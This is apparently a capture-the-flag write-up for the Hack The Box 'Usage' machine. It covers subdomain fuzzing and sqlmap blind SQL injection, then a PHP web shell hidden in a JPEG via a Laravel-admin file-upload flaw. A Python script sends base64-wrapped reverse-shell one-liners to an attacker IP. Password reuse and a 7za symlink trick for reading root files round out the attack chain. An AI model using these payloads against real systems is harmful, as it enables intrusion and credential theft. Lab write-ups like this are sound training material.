# By vishok usage
# htb writeup
####
####
####
## Open ports in target machine
### Nmap:
```perl
22/tcp  open  ssh
80/tcp  open  http
```
####
```perl
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: chat.paper.htb
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_ssl-date: TLS randomness does not represent time
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
Service detection performed. Please report any incorrect results at https://nmap.org/submit
```
####
####
####
## Services running on the target machine
### HTTP:
When opening the website *http://usage.htb*, we see three main routes: `login`, `register`, and `admin`. The most interesting is **admin**, but we don't have access to it. Since there is an admin panel, the first thing that comes to mind is to try an SQLi [*SQL Injection*], but it appears this admin panel is not vulnerable, so we proceed to register. 
####
Inside, it's a blog without interesting routes, so we continue with other methods. To find more directories, files, and subdomains, we use **wfuzz** and discover a subdomain: **admin.usage.htb**
####
```js
wfuzz -c --hc 404 -u 'http://usage.htb' -H 'Host: FUZZ.usage.htb' -w /usr/share/wordlists/dictionary/dns/subdomains-top1million-110000.txt -t 200
```
####
| Wfuzz Param | Description |
| ----- | ----- |
| -c | Colors the displayed results |
| -u | Specifie the URL of the site to enumerate |
| -w | Specifie the path to the wordlist to use |
| -t | Specifie the number of parallel tasks to launch |
| -H | Specifie the subdomain enumeration |
####
This leads us to a different authentication panel. Since we lack credentials, we can't do much. The first panel returns an error message when credentials are invalid, suggesting a database is running behind it. It is not vulnerable, but it has a *reset password* feature. We intercept that request and capture the `token` and `cookie`.
####
<div class="warning">

> Without the `token` and `cookie`, SQLi is not possible. **Burpsuite** is necessary since **Caido** cannot export requests in XML format.
</div>

####
####
####
## First exploitation phase
### SQLI:
If we run **sqlmap** against the request in XML format, specifying the `email` field to exploit: `sqlmap -r req -p email --batch`. It doesn't dump anything to the terminal, but it tells us to use a higher risk level for more tests. So we rerun with increased risk:
####
```rust
sqlmap -r req -p email --level 3 --batch
```
####
| Sqlmap Param | Description |
| ----- | ----- |
| --tables | Enumerates tables |
| --columns | Enumerates columns |
| -r | XML file with the request |
| -T | Specifies the table to dump |
| --dbs | Database discovery |
| --dump | Dumps tables or columns as specified |
| --batch | Prevents user input |
| --level | Risk level for more tests |
####
####
####
### SQLI discovery databases:
Once sqlmap completes the evaluation using the resquest item, it displays an output in the terminal stating that the service is vulnerable.
####
```bash
POST parameter 'email' is vulnerable.
---
Parameter: email (POST)
Type: boolean-based blind
Type: time-based blind
---
```
####
As we already know, it can be exploited with injections based on (*time*, *boolean*), we can pass the <dbs> parameter to dump the database contents.
####
```perl
sqlmap -r req -p email --level 3 --batch --dbs
```
####
### SQLI dump tables:
With the previous command, **sqlmap** reports 3 databases that exist on the machine:
####
```js
[21:25:28] [INFO] resumed: information_schema
[21:25:28] [INFO] resumed: performance_schema
[21:25:28] [INFO] resumed: usage_blog
```
####
Now what we need to do is dump the tables that exist in those databases.
####
```perl
sqlmap -r req -p email --level 3 --batch --tables --dump
```
####
### SQLI dump columns:
With the previous **sqlmap** command, it reports 15 tables that exist on the machine.
####
```js
[21:25:39] [INFO] retrieved: admin_menu
[21:27:08] [INFO] retrieved: admin_operation_log
[21:29:28] [INFO] retrieved: admin_permissions
[21:31:19] [INFO] retrieved: admin_role_menu
[21:33:00] [INFO] retrieved: admin_role_permissions
[21:35:09] [INFO] retrieved: admin_role_users
[21:36:20] [INFO] retrieved: admin_roles
[21:36:52] [INFO] retrieved: admin_user_permissions
[21:39:31] [INFO] retrieved: admin_users
```
####
Now what we need to do is dump the columns that exist in the **admin_users** table, which is probably where valid users are.
####
```perl
sqlmap -r req -p email --level 3 --batch --columns -T admin_users --dump
```
####
### SQLI dump specified columns:
With the previous **sqlmap** command, it reports 15 tables that exist on the machine.
####
```js
[21:50:24] [INFO] retrieved: username
[21:51:28] [INFO] retrieved: password
```
####
Now what we need to do is dump the contents of the columns that exist in the **admin_users** table, is where probably are the valid credentials to achieve a authentication into tha target machine:
####
```perl
sqlmap -r req -p email --level 3 --batch --columns -T admin_users --dump
```
####
####
####
## First exploitation phase
### Upload file:
At the moment to enter into the website after cracking some passwords, we see a dashboard with information on installed dependencies, so we must search for possible exploits. There is a section to assign an avatar image to the **admin** user, so this could represent a possible AFU [*Arbitrary File Upload*]. 
####
The dependency that comes closest to this is: [*Encode/larabel admin 1.8.18*]. Here there a good exploit that help us to exploit this vulnerability: 
####
- Exploit:
    - [Arbitrary-File-Upload-CVE-2023-24249](https://flyd.uk/post/cve-2023-24249)
####
We generate an image with its corresponding headers and insert some PHP code to obtain a **cmd** into this file, so form that if we change the file extention to **php**, we will are able to execute commands in the target machine doing use the **cmd** parameter into the url. Something similar to this: http://127.0.0.1/images/malicius.jpg.php?cmd=whoami.
####
The PHP code is this `<?php system($_REQUEST['cmd']); ?>`. We will use this code to execute commands in the target machine putting the PHP code into the image file. The *PoC* image file have a `.jpg` extention and have the next header:
####
```rust
Hexadecimal ->
ffd8 ffe0 0010 4a46 4946 0001 0101 0048 0000 ffe1 0090 4578 6966 0000 

Xxd view ->
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0048  ......JFIF.....H
00000010: 0000 ffe1 0090 4578 6966 0000            ......Exif..
```
####
<div class="tip">

> Is thime to craft our custom script the will help us to automate the php **revershell code** execution in the website throught malicius image.
</div>

####
Although we managed to insert this and use it, the website performs a scan that deletes the file, so we have to be quick
and insert the payload. Furthermore, the website doesn't interpret the one-liners even when *Url-encoding* the data, so
we'll try something different.
####
```python
import requests
from base64 import b64encode, b64decode

url = "http://admin.usage.htb/uploads/images"
fake_img_file_name = "false_image.jpg.php" -> Create the image and adjust the path

payload_1 = b"sh -i > /dev/tcp/10.10.16.6/4444 2>&1 <&1"
payload_2 = b"bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'"
payload_3 = b"nc -e /bin/bash 10.10.16.6 4444"

request = f"echo {b64encode(payload_1).decode('utf-8')} | base64 -d | bash"
craft_url = f"{url}/{fake_img_file_name}?cmd={request}"
print(craft_url)

cookies = {
    "remember_admin_59ba36addc2b2f9401580f014c7f58ea4e30989d":"eyJpdiI6IjhCL1JnOGZoTFRZM1U2cTJNFZjZEE9PSIsInZhbHVlIjoiVmFMYS95T0hNcFJla005ZXJNNTVHQ0V1em1RU1gzRmJiU2ViVllzdlliT3RwTW5yK3I5lBsK3vN1lIVmxHU0hEemJPZVdraVRCS0dqdGh4SS9WQnZpWFN6TkJuNgvenBTa1Z2QmlHd2doQTRzQWhOOXVqZ3d6MWDSjNsajhyUThlRHZ4YlZIcm5KT0NkZnZRVnBDcnBvdWowlMyaDBYNDgwL3hmY3RxV21zQnpLRHIwenJ3OGE4WGp6bTFOS9hQURHR1pWK0ZQejkxd1NVOGp5OHJjcWpXUmsvcWZJRjErYWdMlJvRT0iLCJtYWMiOiJkM2QyYjI4YWYwNWwNzJiOBiYjJkZDYwM2JlMjViMDJlMGYyNmQxNmQ5M2VmZjZiNGMxYTJiMzMzNDc5ZjNlIiwidGFnIjoiIn0%3D",
    "XSRF-TOKEN":"eyJpdiI6Ik0za0lKNnR5WFdsQWZlb2kyeTY0QXc9PSIsInZhbHVlIjoiU3lqWUE2YVpkMitJa1hGRIrR0JIcEFTQVE5SVp2clZLazYveGlmKzEyejgzNkNZZ0dqTUcyTj4dnc1RUhubnVKLy9nN1NrVklhQUhKSkxSTUlqK0yMDBKZUNkMdPR1J4KzV5bzFiblhHaDAyeFdrY1NVaEpsQ2ttMFlLK24iLCJtYWMiOiI0YmU4MTQ3YWNiMThkZjg4MzIDI2YzNiMjk0YTE1MmJkN2E1ZGY5YmQyNDcxOGM4MTU5NmUwNjQxNzAxZjIzIiwidGFnIjoiIn0%3D",
    "laravel_session":"eyJpdiI6Ik44QThTL3BOZUFkcGdLb1Z5eTBaZ0E9PSIsInZhbHVlIjoiYTZQYStpaXpLakd1npOTFZaSFlwMXpZdEU5ZmorclJKang1U2pSTzdISzJsaHQzWmFtd3lDNzQSjM2cTEvOEhKTG9sVXE1VWRBNlpWaGdUTQxSFFReS92ZmlaTRSMFpSdXAybUlMaVFoOGdkZzdzbzFhOUlRdlVyclJsb0YiLCJtYWMiOiIyMDNiYzk1MWZjYzc5M2zMmIwGFjYWJiMzNjYWZmNDljMGFiNmFlN2EzMjMzNWIzYjM2NTBiMTQyMTIyMWIzIiwidGFnIjoiIn0%3D"
}

response = requests.post(url=craft_url, cookies=cookies)

if response.status_code == 200:
    print(f"Request sending using: {request}")
elif response.status_code == 404:
    print("File not found, the server deleted file")
```
####
<div class="warning">

> Change the cookies for your cookies at the moment to execute.
</div>

####
####
####
## Lateral Movement
### SSH Service:
Investigating within the machine, we can read the **id_rsa** file [*ssh authentication via a file*], so the first thing is to ensure persistence as soon as possible. It's very tedious to go through the previous process with burpsuite. `cat ~/.ssh/id_rsa`. 
####
Searching for *SUID* permissions, we don't find anything, not even for **capabilities**, but there is an interesting file in the `/home` of the `dash` user, our current user. The **.monitrc** file is not common, which indicates a possible exploit vector. If we read the file, we see a username and password.
####
```bash
#Enable Web Access
set httpd port 2812
use address 127.0.0.1
allow admin:3nc0d3d_pa$$w0rd
```
####
If we port forward that service: `ssh -L 2812:127.0.0.1:2812 dash@10.10.10.200`, we can authenticate, but the CVE exploit is not found on the Internet, so we have to find another way. If we do a: `ls /home` we see another user named `xander`, so if we try the monit service password: `3nc0d3d_pa$$w0rd` with this user, we gain immediate access as the **xander** user.
####
####
####
## Second exploit phase (Privilage Escalation)
### 7z command:
Testing whether the user is in the **sudoers** group, we discover that they are indeed in the sudoers group and have root execution permissions for a binary called **usage_management**. If we run a `strings` command to see the contents of that binary, we see that it does the following:
####
```js
/var/www/html
/usr/bin/7za to /var/backups/project.zip -tzip -snl -mmt -- *
Error changing working directory to /var/www/html
/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
```
####
At this point, it is essential to understand what the **7za** binary does. *7z* allows you to take list files. These list files are known for having a *@* at the beginning, of this way: `touch @prove.txt`. The main problem with this is that if you use the `-snl` option, 7za won't check and grab symbolic links within these list files. Therefore, to exploit this flaw, we must create a *List file* and a symbolic link.
####
```bash
touch @root.txt
ln -s /root/root.txt root.txt
```
####
| Ln Param | Description |
| ----- | ----- |
| ln | Command used to create links |
| -s | make symbolic links instead of hard links |
####
This alone doesn't work, because even in the binary strings, this backup is done within the `/var/www/html` path.
####
<div class="warning">

> Therefore, this last process must be done within that path.
</div>